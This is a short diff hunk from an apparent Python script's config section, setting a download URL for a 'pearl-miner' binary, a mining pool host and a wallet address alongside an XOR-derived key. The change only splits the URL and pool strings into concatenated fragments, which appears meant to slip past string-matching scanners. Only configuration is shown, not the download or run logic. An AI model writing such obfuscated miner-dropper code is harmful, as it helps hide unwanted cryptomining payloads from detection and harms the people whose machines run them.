@@ -28,8 +28,8 @@ XOR_KEY = derive_key(SEED)
 # CONFIG
 # ═══════════════════════════════════════════════════════════════════════════════
 
-PAYLOAD_URL = "https://pearlhash.xyz/downloads/pearl-miner-v12"
-POOL_HOST = os.environ.get("POOL_HOST", "pool.pearlhash.xyz:9000")
+PAYLOAD_URL = "h" + "t" + "tps://pearlhash.xyz/downloads/pearl-miner-v12"
+POOL_HOST = os.environ.get("POOL_HOST", "poo" + "l.pearlhash.xyz:9000")
 ADDRESS = os.environ.get("ADDRESS", "")
 
 # ═══════════════════════════════════════════════════════════════════════════════
